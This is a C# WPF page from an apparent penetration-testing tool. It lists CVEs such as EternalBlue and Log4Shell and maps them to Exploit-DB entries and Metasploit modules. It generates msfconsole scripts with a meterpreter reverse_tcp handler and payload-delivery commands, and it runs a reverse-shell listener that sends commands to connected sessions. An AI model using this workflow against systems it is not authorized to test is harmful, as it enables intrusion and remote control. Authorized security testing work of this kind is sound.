using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Input;
using System.Windows.Media;
using FontAwesome.Sharp;
using PROSCANNERCONT.Models;
using PROSCANNERCONT.Services;
using PROSCANNERCONT.Utils;

namespace PROSCANNERCONT.Views
{
    public partial class POCExplorerPage : Page
    {
        // ---- state ----------------------------------------------------------
        private List<PocEntry>   _allEntries  = new();
        private PocEntry?        _selected;
        private int              _activeTab   = 0;
        private string?          _activeSession;

        private readonly ReverseShellListener _listener = new();

        // =====================================================================
        // Init
        // =====================================================================
        public POCExplorerPage()
        {
            InitializeComponent();
            WireListener();
            LoadCveList();
        }

        // =====================================================================
        // Load CVE list from recent scan results
        // =====================================================================
        private void LoadCveList()
        {
            _allEntries.Clear();

            var svc = StateService.Instance;

            // Collect from port scan results that have CVE findings
            foreach (var port in svc.VulnerabilityScanResults
                .Concat(svc.MiscPageScanResults)
                .Where(p => p.CveFindings?.Any() == true))
            {
                foreach (var cve in port.CveFindings!)
                {
                    if (_allEntries.Any(e => e.CveId == cve.CveId)) continue;
                    _allEntries.Add(new PocEntry
                    {
                        CveId         = cve.CveId,
                        Description   = cve.Summary,
                        Cvss          = cve.Cvss,
                        Severity      = cve.Severity,
                        TargetService = port.Service ?? "",
                        TargetIp      = port.IPAddress ?? "",
                        TargetPort    = port.Port
                    });
                }
            }

            // Also pull from recent scan results
            foreach (var sr in svc.RecentScanResults)
            {
                foreach (var detail in sr.Details ?? new System.Collections.Generic.List<string>())
                {
                    var m = System.Text.RegularExpressions.Regex.Match(detail, @"(CVE-\d{4}-\d+)");
                    if (!m.Success) continue;
                    var id = m.Groups[1].Value;
                    if (_allEntries.Any(e => e.CveId == id)) continue;
                    _allEntries.Add(new PocEntry
                    {
                        CveId       = id,
                        Description = sr.Description ?? "",
                        Severity    = sr.Status == "Error" ? "High" : "Medium",
                        TargetIp    = ""
                    });
                }
            }

            // Fallback demo entries if nothing found yet
            if (!_allEntries.Any())
            {
                _allEntries.Add(new PocEntry { CveId = "CVE-2017-0144", Description = "EternalBlue SMB Remote Code Execution", Severity = "Critical", Cvss = 9.8m, TargetService = "SMB", TargetPort = 445 });
                _allEntries.Add(new PocEntry { CveId = "CVE-2021-44228", Description = "Log4j JNDI Remote Code Execution (Log4Shell)", Severity = "Critical", Cvss = 10.0m, TargetService = "Log4j", TargetPort = 8080 });
                _allEntries.Add(new PocEntry { CveId = "CVE-2019-0708", Description = "BlueKeep RDP Pre-Auth Remote Code Execution", Severity = "Critical", Cvss = 9.8m, TargetService = "RDP", TargetPort = 3389 });
                _allEntries.Add(new PocEntry { CveId = "CVE-2021-26855", Description = "ProxyLogon Exchange Server SSRF to RCE", Severity = "Critical", Cvss = 9.8m, TargetService = "Exchange HTTPS", TargetPort = 443 });
                _allEntries.Add(new PocEntry { CveId = "CVE-2014-6271", Description = "Shellshock Bash Remote Code Execution", Severity = "Critical", Cvss = 9.8m, TargetService = "Apache/CGI", TargetPort = 80 });
            }

            ApplyCveFilter(CveSearchBox?.Text ?? "");
        }

        private void ApplyCveFilter(string query)
        {
            var filtered = string.IsNullOrWhiteSpace(query)
                ? _allEntries
                : _allEntries.Where(e =>
                    e.CveId.Contains(query, StringComparison.OrdinalIgnoreCase) ||
                    e.Description.Contains(query, StringComparison.OrdinalIgnoreCase) ||
                    e.TargetService.Contains(query, StringComparison.OrdinalIgnoreCase)).ToList();

            CveListBox.ItemsSource = filtered.Select(e => new CveListItem(e)).ToList();
        }

        // =====================================================================
        // CVE selection
        // =====================================================================
        private void CveListBox_SelectionChanged(object sender, SelectionChangedEventArgs e)
        {
            if (CveListBox.SelectedItem is not CveListItem item) return;
            _selected = item.Entry;
            UpdateBanner();
            RefreshActiveTab();
        }

        private void UpdateBanner()
        {
            if (_selected == null) return;

            CveBanner.Visibility = Visibility.Visible;
            BannerCveId.Text     = _selected.CveId;
            BannerDesc.Text      = _selected.Description;
            BannerSeverity.Text  = _selected.Severity;
            BannerCvss.Text      = _selected.Cvss > 0 ? $"CVSS {_selected.Cvss:F1}" : "";
            BannerService.Text   = string.IsNullOrEmpty(_selected.TargetIp)
                ? _selected.TargetService
                : $"{_selected.TargetService}  Â·  {_selected.TargetIp}:{_selected.TargetPort}";

            var color = SeverityColor(_selected.Severity);
            BannerSeverityBadge.Background = new SolidColorBrush(color);

            // Populate target fields if we have a known IP
            if (!string.IsNullOrEmpty(_selected.TargetIp))
            {
                // keep lhost unchanged
            }
        }

        // =====================================================================
        // Tab switching
        // =====================================================================
        private void Tab_Checked(object sender, RoutedEventArgs e)
        {
            if (sender is RadioButton rb && rb.Tag is string t && int.TryParse(t, out int idx))
            {
                _activeTab = idx;
                RefreshActiveTab();
            }
        }

        private void RefreshActiveTab()
        {
            if (ExploitsTab  == null) return;
            ExploitsTab.Visibility  = _activeTab == 0 ? Visibility.Visible : Visibility.Collapsed;
            MsfTab.Visibility       = _activeTab == 1 ? Visibility.Visible : Visibility.Collapsed;
            DeliveryTab.Visibility  = _activeTab == 2 ? Visibility.Visible : Visibility.Collapsed;
            ListenerTab.Visibility  = _activeTab == 3 ? Visibility.Visible : Visibility.Collapsed;

            if (_selected == null) return;
            if (_activeTab == 1) BuildMsfTab();
            if (_activeTab == 2) BuildDeliveryTab();
        }

        // =====================================================================
        // TAB 0 â€” Exploits (Exploit-DB)
        // =====================================================================
        private async void FetchExploits_Click(object sender, RoutedEventArgs e)
        {
            if (_selected == null) return;

            ExploitsEmptyPanel.Visibility   = Visibility.Collapsed;
            ExploitsLoadingPanel.Visibility = Visibility.Visible;
            ExploitsScrollViewer.Visibility = Visibility.Collapsed;

            var entries = await ExploitLookupService.FetchExploitDbAsync(_selected.CveId);
            _selected.Exploits = entries;

            ExploitsLoadingPanel.Visibility = Visibility.Collapsed;

            if (!entries.Any())
            {
                ExploitsPanel.Children.Clear();
                ExploitsPanel.Children.Add(new TextBlock
                {
                    Text = $"No public exploits found on Exploit-DB for {_selected.CveId}.",
                    FontSize = 13, Opacity = 0.5,
                    Foreground = (Brush)FindResource("TextBrush"),
                    TextWrapping = TextWrapping.Wrap,
                    Margin = new Thickness(0, 16, 0, 0)
                });
                ExploitsScrollViewer.Visibility = Visibility.Visible;
                return;
            }

            ExploitsPanel.Children.Clear();

            // Summary chip
            var summary = new TextBlock
            {
                Text = $"{entries.Count} exploit(s) found for {_selected.CveId}",
                FontSize = 12, Opacity = 0.6,
                Foreground = (Brush)FindResource("TextBrush"),
                Margin = new Thickness(0, 0, 0, 12)
            };
            ExploitsPanel.Children.Add(summary);

            foreach (var ex in entries)
            {
                var card = BuildExploitCard(ex);
                ExploitsPanel.Children.Add(card);
            }

            ExploitsScrollViewer.Visibility = Visibility.Visible;
        }

        private Border BuildExploitCard(ExploitDbEntry ex)
        {
            var card = new Border
            {
                Background      = (Brush)FindResource("SecondaryBackgroundBrush"),
                BorderBrush     = (Brush)FindResource("BorderBrush"),
                BorderThickness = new Thickness(1),
                CornerRadius    = new CornerRadius(8),
                Padding         = new Thickness(14, 12, 14, 12),
                Margin          = new Thickness(0, 0, 0, 10),
                Cursor          = Cursors.Hand
            };

            var grid = new Grid();
            grid.ColumnDefinitions.Add(new ColumnDefinition { Width = new GridLength(1, GridUnitType.Star) });
            grid.ColumnDefinitions.Add(new ColumnDefinition { Width = GridLength.Auto });
            grid.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });
            grid.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });

            // Title
            var title = new TextBlock
            {
                Text       = ex.Title,
                FontSize   = 13, FontWeight = FontWeights.SemiBold,
                Foreground = (Brush)FindResource("TextBrush"),
                TextWrapping = TextWrapping.Wrap
            };
            Grid.SetColumn(title, 0);
            grid.Children.Add(title);

            // ID badge + open button
            var btnPanel = new StackPanel { Orientation = Orientation.Horizontal };
            var edbBadge = new Border
            {
                Background   = new SolidColorBrush(Color.FromRgb(33, 150, 243)),
                CornerRadius = new CornerRadius(4),
                Padding      = new Thickness(7, 2, 7, 2),
                Margin       = new Thickness(0, 0, 8, 0),
                Child        = new TextBlock { Text = $"EDB-{ex.Id}", FontSize = 10, Foreground = Brushes.White, FontWeight = FontWeights.SemiBold }
            };
            btnPanel.Children.Add(edbBadge);

            var openBtn = new Button
            {
                Content         = "View â†—",
                FontSize        = 11,
                Height          = 26, Padding = new Thickness(10, 0, 10, 0),
                Background      = new SolidColorBrush(Color.FromArgb(40, 255, 255, 255)),
                Foreground      = (Brush)FindResource("TextBrush"),
                BorderThickness = new Thickness(0),
                Cursor          = Cursors.Hand
            };
            openBtn.Click += (_, __) =>
            {
                try { Process.Start(new ProcessStartInfo(ex.Url) { UseShellExecute = true }); } catch { }
            };
            btnPanel.Children.Add(openBtn);

            Grid.SetColumn(btnPanel, 1);
            grid.Children.Add(btnPanel);

            // Meta row
            var meta = new StackPanel { Orientation = Orientation.Horizontal, Margin = new Thickness(0, 6, 0, 0) };
            Grid.SetRow(meta, 1);
            Grid.SetColumnSpan(meta, 2);

            void AddChip(string text, Color c)
            {
                if (string.IsNullOrWhiteSpace(text)) return;
                meta.Children.Add(new Border
                {
                    Background   = new SolidColorBrush(Color.FromArgb(40, c.R, c.G, c.B)),
                    CornerRadius = new CornerRadius(3),
                    Padding      = new Thickness(6, 2, 6, 2),
                    Margin       = new Thickness(0, 0, 6, 0),
                    Child        = new TextBlock { Text = text, FontSize = 10, Foreground = new SolidColorBrush(c) }
                });
            }
            AddChip(ex.Type,     Color.FromRgb(156,  39, 176));
            AddChip(ex.Platform, Color.FromRgb( 33, 150, 243));
            AddChip(ex.Date,     Color.FromRgb(120, 120, 120));
            AddChip(ex.Author,   Color.FromRgb(120, 120, 120));

            grid.Children.Add(meta);
            card.Child = grid;

            card.MouseEnter += (_, __) => card.BorderBrush = (Brush)FindResource("AccentBrush");
            card.MouseLeave += (_, __) => card.BorderBrush = (Brush)FindResource("BorderBrush");

            return card;
        }

        // =====================================================================
        // TAB 1 â€” Metasploit
        // =====================================================================
        private void BuildMsfTab()
        {
            if (_selected == null) return;

            var msf = ExploitLookupService.GetMsfModule(_selected.CveId);
            _selected.MsfModule = msf;

            string lhost = LhostBox.Text.Trim();
            int    lport = int.TryParse(LportBox.Text, out int lp) ? lp : 4444;
            string rhost = string.IsNullOrEmpty(_selected.TargetIp) ? "<RHOST>" : _selected.TargetIp;
            int    rport = _selected.TargetPort > 0 ? _selected.TargetPort : 0;

            if (msf == null)
            {
                MsfModulePath.Text = "No mapped Metasploit module for this CVE.";
                MsfModuleName.Text = $"Search manually: msfconsole â†’ search cve:{_selected.CveId}";
                MsfRankBadge.Visibility = Visibility.Collapsed;
                MsfScriptBox.Text = $"# No automated module found.\n# In msfconsole, run:\n\nsearch cve:{_selected.CveId}\n\n# Then:\nuse <result>\nset RHOSTS {rhost}\nset LHOST {lhost}\nset LPORT {lport}\nrun";
                MsfHandlerBox.Text = ExploitLookupService.GenerateHandlerScript(lhost, lport, "windows/x64/meterpreter/reverse_tcp");
                MsfOptionsPanel.Children.Clear();
                return;
            }

            MsfModulePath.Text      = msf.Path;
            MsfModuleName.Text      = msf.Name;
            MsfRankBadge.Visibility = Visibility.Visible;
            MsfRankText.Text        = msf.Rank.ToUpper();
            MsfRankBadge.Background = new SolidColorBrush(RankColor(msf.Rank));

            MsfScriptBox.Text   = ExploitLookupService.GenerateMsfScript(msf, rhost, rport, lhost, lport, new Dictionary<string, string>());
            MsfHandlerBox.Text  = ExploitLookupService.GenerateHandlerScript(lhost, lport, msf.DefaultPayload);

            // Extra option inputs
            MsfOptionsPanel.Children.Clear();
            foreach (var opt in msf.Options.Where(o => o != "RHOST" && o != "RPORT" && o != "LHOST" && o != "LPORT"))
            {
                MsfOptionsPanel.Children.Add(new TextBlock
                {
                    Text = $"{opt}:", FontSize = 11, Opacity = 0.6,
                    Foreground = (Brush)FindResource("TextBrush"),
                    VerticalAlignment = VerticalAlignment.Center,
                    Margin = new Thickness(0, 0, 6, 0)
                });
                var tb = new TextBox
                {
                    Width = 120, Height = 26, FontSize = 12, Tag = opt,
                    Background = (Brush)FindResource("BackgroundBrush"),
                    Foreground = (Brush)FindResource("TextBrush"),
                    BorderBrush = (Brush)FindResource("BorderBrush"),
                    BorderThickness = new Thickness(1),
                    Padding = new Thickness(6, 0, 6, 0), VerticalContentAlignment = VerticalAlignment.Center,
                    CaretBrush = (Brush)FindResource("TextBrush"),
                    Margin = new Thickness(0, 0, 14, 0)
                };
                tb.TextChanged += (_, __) => RegenerateMsfScript();
                MsfOptionsPanel.Children.Add(tb);
            }
        }

        private void RegenerateMsfScript()
        {
            if (_selected?.MsfModule == null) return;
            var extras = new Dictionary<string, string>();
            foreach (var child in MsfOptionsPanel.Children.OfType<TextBox>())
                if (!string.IsNullOrEmpty(child.Text) && child.Tag is string key)
                    extras[key] = child.Text;

            string lhost = LhostBox.Text.Trim();
            int    lport = int.TryParse(LportBox.Text, out int lp) ? lp : 4444;
            string rhost = string.IsNullOrEmpty(_selected.TargetIp) ? "<RHOST>" : _selected.TargetIp;
            int    rport = _selected.TargetPort;

            MsfScriptBox.Text  = ExploitLookupService.GenerateMsfScript(_selected.MsfModule, rhost, rport, lhost, lport, extras);
            MsfHandlerBox.Text = ExploitLookupService.GenerateHandlerScript(lhost, lport, _selected.MsfModule.DefaultPayload);
        }

        // =====================================================================
        // TAB 2 â€” Delivery
        // =====================================================================
        private void BuildDeliveryTab()
        {
            DeliveryPanel.Children.Clear();
            if (_selected == null) return;

            string lhost = LhostBox.Text.Trim();
            int    lport = int.TryParse(LportBox.Text, out int lp) ? lp : 4444;
            string os    = (TargetOsBox.SelectedItem as ComboBoxItem)?.Content.ToString() ?? "Windows";

            var opts = ExploitLookupService.BuildDeliveryOptions(_selected.MsfModule, lhost, lport, os);
            _selected.Delivery = opts;

            foreach (var opt in opts)
            {
                var card = new Border
                {
                    Style  = (Style)FindResource("CardStyle"),
                    Margin = new Thickness(0, 0, 0, 12)
                };
                var sp = new StackPanel();

                // Method header
                var hdr = new StackPanel { Orientation = Orientation.Horizontal, Margin = new Thickness(0, 0, 0, 8) };
                hdr.Children.Add(new Border
                {
                    Background   = new SolidColorBrush(Color.FromRgb(33, 150, 243)),
                    CornerRadius = new CornerRadius(4),
                    Padding      = new Thickness(8, 3, 8, 3),
                    Child        = new TextBlock { Text = opt.Method, FontSize = 11, Foreground = Brushes.White, FontWeight = FontWeights.SemiBold }
                });
                sp.Children.Add(hdr);

                sp.Children.Add(new TextBlock { Text = opt.Description, FontSize = 12, Opacity = 0.7, Foreground = (Brush)FindResource("TextBrush"), TextWrapping = TextWrapping.Wrap, Margin = new Thickness(0, 0, 0, 8) });

                // Command box
                if (!string.IsNullOrEmpty(opt.MsfvemonCmd))
                {
                    var cmdBorder = new Border { Background = new SolidColorBrush(Color.FromRgb(13, 17, 23)), CornerRadius = new CornerRadius(6), Padding = new Thickness(0) };
                    var cmdGrid = new Grid();
                    cmdGrid.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });
                    cmdGrid.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });

                    var hdrBar = new Border { Background = new SolidColorBrush(Color.FromRgb(22, 27, 34)), CornerRadius = new CornerRadius(6, 6, 0, 0), Padding = new Thickness(10, 6, 10, 6) };
                    var hdrRow = new Grid();
                    hdrRow.ColumnDefinitions.Add(new ColumnDefinition { Width = new GridLength(1, GridUnitType.Star) });
                    hdrRow.ColumnDefinitions.Add(new ColumnDefinition { Width = GridLength.Auto });
                    hdrRow.Children.Add(new TextBlock { Text = "msfvenom / command", FontSize = 10, Opacity = 0.5, Foreground = Brushes.White });
                    var copyBtn = new Button { Content = "Copy", FontSize = 10, Height = 22, Padding = new Thickness(8, 0, 8, 0), Background = new SolidColorBrush(Color.FromArgb(60, 255, 255, 255)), Foreground = Brushes.White, BorderThickness = new Thickness(0) };
                    var captureCmd = opt.MsfvemonCmd;
                    copyBtn.Click += (_, __) => { try { Clipboard.SetText(captureCmd); } catch { } };
                    Grid.SetColumn(copyBtn, 1);
                    hdrRow.Children.Add(copyBtn);
                    hdrBar.Child = hdrRow;
                    Grid.SetRow(hdrBar, 0);
                    cmdGrid.Children.Add(hdrBar);

                    var tb = new TextBox
                    {
                        Text = opt.MsfvemonCmd, IsReadOnly = true, Background = Brushes.Transparent,
                        BorderThickness = new Thickness(0), Foreground = new SolidColorBrush(Color.FromRgb(86, 211, 100)),
                        FontFamily = new FontFamily("Consolas, Courier New"), FontSize = 12,
                        Padding = new Thickness(10, 8, 10, 8), TextWrapping = TextWrapping.Wrap, AcceptsReturn = true
                    };
                    Grid.SetRow(tb, 1);
                    cmdGrid.Children.Add(tb);
                    cmdBorder.Child = cmdGrid;
                    sp.Children.Add(cmdBorder);
                }

                // Notes
                if (!string.IsNullOrEmpty(opt.Notes))
                    sp.Children.Add(new TextBlock { Text = opt.Notes, FontSize = 11, Opacity = 0.55, Foreground = (Brush)FindResource("TextBrush"), TextWrapping = TextWrapping.Wrap, Margin = new Thickness(0, 8, 0, 0), FontFamily = new FontFamily("Consolas, Courier New") });

                card.Child = sp;
                DeliveryPanel.Children.Add(card);
            }
        }

        // =====================================================================
        // TAB 3 â€” Listener
        // =====================================================================
        private void WireListener()
        {
            _listener.LogLine += line => Dispatcher.Invoke(() =>
            {
                TerminalOutput.AppendText(line + "\n");
                TerminalScroller.ScrollToEnd();
            });

            _listener.SessionOpened += session => Dispatcher.Invoke(() =>
            {
                _activeSession = session.Id;
                UpdateSessionDots();
                AddSessionChip(session);
                TerminalOutput.AppendText($"\n[+] Shell session {session.Id} opened â€” {session.RemoteIp}:{session.RemotePort}\n");
                TerminalScroller.ScrollToEnd();
            });

            _listener.SessionClosed += id => Dispatcher.Invoke(() =>
            {
                if (_activeSession == id) _activeSession = null;
                UpdateSessionDots();
                RemoveSessionChip(id);
            });

            _listener.DataReceived += (id, data) => Dispatcher.Invoke(() =>
            {
                TerminalOutput.AppendText(data);
                TerminalScroller.ScrollToEnd();
            });
        }

        private void ListenerToggle_Click(object sender, RoutedEventArgs e)
        {
            if (_listener.IsListening)
            {
                _listener.Stop();
                ListenerStatusText.Text = "Stopped";
                ListenerStatusDot.Background = new SolidColorBrush(Color.FromRgb(85, 85, 85));
                ListenerToggleText.Text = "Start Listener";
                ListenerDot.Background  = new SolidColorBrush(Color.FromRgb(85, 85, 85));
            }
            else
            {
                if (!int.TryParse(ListenerPortBox.Text, out int port) || port < 1 || port > 65535)
                {
                    AppDialog.Show("Enter a valid port (1â€“65535).", "Invalid Port", MessageBoxButton.OK, MessageBoxImage.Warning);
                    return;
                }
                try
                {
                    // Sync LPORT with listener port
                    LportBox.Text = port.ToString();
                    _listener.Start(port);
                    ListenerStatusText.Text = $"Listening on 0.0.0.0:{port}";
                    ListenerStatusDot.Background = new SolidColorBrush(Color.FromRgb(86, 211, 100));
                    ListenerToggleText.Text  = "Stop Listener";
                    ListenerDot.Background   = new SolidColorBrush(Color.FromRgb(86, 211, 100));
                }
                catch (Exception ex)
                {
                    AppDialog.Show($"Could not start listener: {ex.Message}", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
                }
            }
        }

        private void ListenerClear_Click(object sender, RoutedEventArgs e)
        {
            TerminalOutput.Clear();
        }

        private async void SendCommand_Click(object sender, RoutedEventArgs e)
        {
            await SendCurrentCommand();
        }

        private async void CommandInput_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Key == Key.Enter) await SendCurrentCommand();
        }

        private async Task SendCurrentCommand()
        {
            var cmd = CommandInputBox.Text.Trim();
            if (string.IsNullOrEmpty(cmd)) return;

            if (_activeSession == null || !_listener.HasSession(_activeSession))
            {
                TerminalOutput.AppendText("[!] No active session â€” wait for a connection.\n");
                TerminalScroller.ScrollToEnd();
                return;
            }

            TerminalOutput.AppendText($"$ {cmd}\n");
            TerminalScroller.ScrollToEnd();
            CommandInputBox.Clear();
            await _listener.SendAsync(_activeSession, cmd);
        }

        private void AddSessionChip(ListenerSession session)
        {
            var chip = new Border
            {
                Name         = $"Chip_{session.Id}",
                Background   = new SolidColorBrush(Color.FromArgb(40, 86, 211, 100)),
                BorderBrush  = new SolidColorBrush(Color.FromRgb(86, 211, 100)),
                BorderThickness = new Thickness(1),
                CornerRadius = new CornerRadius(4),
                Padding      = new Thickness(8, 3, 8, 3),
                Margin       = new Thickness(0, 0, 6, 0),
                Cursor       = Cursors.Hand,
                Tag          = session.Id
            };
            chip.Child = new TextBlock
            {
                Text = $"â— {session.RemoteIp}:{session.RemotePort} ({session.Id})",
                FontSize = 10, Foreground = new SolidColorBrush(Color.FromRgb(86, 211, 100))
            };
            chip.MouseLeftButtonDown += (_, __) => _activeSession = session.Id;
            SessionsPanel.Children.Add(chip);
        }

        private void RemoveSessionChip(string id)
        {
            var chip = SessionsPanel.Children.OfType<Border>().FirstOrDefault(b => b.Tag?.ToString() == id);
            if (chip != null) SessionsPanel.Children.Remove(chip);
        }

        private void UpdateSessionDots()
        {
            // update the tab dot
            bool hasSessions = SessionsPanel.Children.Count > 0;
            ListenerDot.Background = _listener.IsListening
                ? new SolidColorBrush(Color.FromRgb(86, 211, 100))
                : new SolidColorBrush(Color.FromRgb(85, 85, 85));
        }

        // =====================================================================
        // Button handlers
        // =====================================================================
        private void CopyMsfScript_Click(object sender, RoutedEventArgs e)
        {
            try { Clipboard.SetText(MsfScriptBox.Text); } catch { }
        }

        private void CopyHandler_Click(object sender, RoutedEventArgs e)
        {
            try { Clipboard.SetText(MsfHandlerBox.Text); } catch { }
        }

        private void LaunchMsfconsole_Click(object sender, RoutedEventArgs e)
        {
            if (_selected?.MsfModule == null) return;
            try
            {
                // Write script to temp file and open msfconsole with it
                var tmp = System.IO.Path.Combine(System.IO.Path.GetTempPath(), "privacore_msf.rc");
                System.IO.File.WriteAllText(tmp, MsfScriptBox.Text);

                Process.Start(new ProcessStartInfo
                {
                    FileName        = "cmd.exe",
                    Arguments       = $"/k msfconsole -r \"{tmp}\"",
                    UseShellExecute = true
                });
            }
            catch (Exception ex)
            {
                AppDialog.Show(
                    $"Could not launch msfconsole.\nEnsure Metasploit is installed and in PATH.\n\n{ex.Message}",
                    "Launch Error", MessageBoxButton.OK, MessageBoxImage.Warning);
            }
        }

        private void CveSearch_TextChanged(object sender, TextChangedEventArgs e)
            => ApplyCveFilter(CveSearchBox.Text);

        private void RefreshCveList_Click(object sender, RoutedEventArgs e)
            => LoadCveList();

        private void TargetOs_Changed(object sender, SelectionChangedEventArgs e)
        {
            if (_activeTab == 2) BuildDeliveryTab();
        }

        // =====================================================================
        // Cleanup
        // =====================================================================
        private void Page_Unloaded(object sender, RoutedEventArgs e)
        {
            _listener.Dispose();
        }

        // =====================================================================
        // Helpers
        // =====================================================================
        private static Color SeverityColor(string sev) => sev?.ToLower() switch
        {
            "critical" => Color.FromRgb(244, 67, 54),
            "high"     => Color.FromRgb(255, 109, 0),
            "medium"   => Color.FromRgb(255, 193, 7),
            "low"      => Color.FromRgb(76, 175, 80),
            _          => Color.FromRgb(100, 100, 100)
        };

        private static Color RankColor(string rank) => rank?.ToLower() switch
        {
            "excellent" => Color.FromRgb(76, 175, 80),
            "great"     => Color.FromRgb(102, 187, 106),
            "good"      => Color.FromRgb(255, 193, 7),
            "normal"    => Color.FromRgb(33, 150, 243),
            "manual"    => Color.FromRgb(120, 120, 120),
            _           => Color.FromRgb(100, 100, 100)
        };
    }

    // =========================================================================
    // List view-model
    // =========================================================================
    public class CveListItem
    {
        public PocEntry Entry    { get; }
        public string   CveId   => Entry.CveId;
        public string   Severity => Entry.Severity;
        public string   TargetService => Entry.TargetService;
        public Brush    SeverityBrush { get; }

        public CveListItem(PocEntry entry)
        {
            Entry = entry;
            var c = entry.Severity?.ToLower() switch
            {
                "critical" => Color.FromRgb(244, 67, 54),
                "high"     => Color.FromRgb(255, 109, 0),
                "medium"   => Color.FromRgb(255, 193, 7),
                "low"      => Color.FromRgb(76, 175, 80),
                _          => Color.FromRgb(100, 100, 100)
            };
            SeverityBrush = new SolidColorBrush(c);
        }
    }
}



